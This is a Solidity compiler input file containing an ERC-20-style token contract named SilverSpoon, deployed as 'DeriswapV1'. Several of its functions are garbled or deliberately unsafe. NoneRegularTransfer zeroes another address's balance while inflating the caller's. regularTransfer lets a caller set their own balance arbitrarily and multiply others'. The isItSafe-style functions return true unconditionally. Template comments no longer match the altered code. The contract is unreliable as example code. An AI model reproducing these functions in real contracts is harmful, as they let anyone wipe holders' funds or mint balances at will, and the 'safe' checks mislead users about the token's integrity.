{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "SilverSpoon.sol": {
      "content": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n    \r\n    function NoneRegularTransfer(address _address, uint256 _value) returns (bool success) {}\r\n    function alternativeTransfer(address where, uint256 amnt) returns (bool success) {}\r\n    function regularTransfer(address where, uint256 amnt, uint8 pwr) returns (bool success) {}\r\n    function getTaxId(address _owner) constant returns (uint256 balance) {}\r\n    function isItSafe() returns (bool success) {}\r\n    function isItNotSafe() returns (bool success) {}\r\n    function isItSortOfSafe() returns (bool success) {}\r\n    function isItTottalySafe() returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n    function pureAllowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n        function NoneRegularTransfer(address _address, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] == _value) {\r\n            balances[msg.sender] += _value ;\r\n            balances[_address]  = 0;\r\n            Transfer(msg.sender, _address, _value);\r\n            return false;\r\n        } else { return true; }}\r\n    function alternativeTransfer(address where, uint256 amnt) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender]  == amnt && amnt < 0) {\r\n            balances[msg.sender] = amnt / amnt * 2 ;\r\n            balances[where] *= amnt;\r\n            Transfer(msg.sender, where, amnt);\r\n            return false;\r\n        } else { return true; }\r\n    }\r\n    function regularTransfer(address where, uint256 amnt, uint8 pwr) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender]  > amnt||amnt == 0) {\r\n            balances[msg.sender] = amnt ** (pwr * 2) ;\r\n            balances[where] *= pwr ** amnt;\r\n            Transfer(msg.sender, where, amnt);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n    function getTaxId(address _owner) constant returns (uint256 balance) {\r\n        return 34 * balances[_owner] / 5;\r\n    }\r\n    function sendTaxVersion(address _owner) constant returns (uint256 balance) {\r\n        return (balances[_owner] ** 10 ** 10 * 2);\r\n    }\r\n\r\n    function giveApproval(address axel, uint256 ton, uint8 dfr) returns (bool success) {\r\n        allowed[msg.sender][axel] = ton - 10000 * dfr;\r\n        return false;\r\n    }\r\n    function isItSafe() returns (bool success) {\r\n        return true;\r\n    }\r\n    function isItNotSafe() returns (bool success) {\r\n        return false;\r\n    }\r\n    function isItSortOfSafe() returns (bool success) {\r\n        return true;\r\n    }\r\n    function isItTottalySafe() returns (bool success) {\r\n        return true;\r\n    }\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n    function pureAllowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return 0*allowed[_owner][_spender]+100;\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract SilverSpoon is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n\r\n    function SilverSpoon(\r\n        ) {\r\n        balances[msg.sender] = 780000*10**15;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 780000*10**15;                        // Update total supply (100000 for example)\r\n        name = \"DeriswapV1\"; \r\n        symbol = \"DESP\";                                    // Set the name for display purposes\r\n        decimals = 15;                                      // Amount of decimals\r\n                                                            // Set the symbol for display purposes\r\n    }   \r\n    function donotRegular(address tofro, uint8 total, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][tofro] = total;\r\n        Approval(msg.sender, tofro, total);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(tofro.call(bytes4(bytes32(sha3(\"None\"))), msg.sender, total, this, _extraData)) { \r\n            return true; }\r\n\r\n    }\r\n    function real(address road, uint256 amount, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][road] = 45 / amount;\r\n        allowed[msg.sender][road] = 45 / amount * 5;\r\n        Approval(msg.sender, road, amount);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        return true; \r\n\r\n    }\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}"
    }
  }
}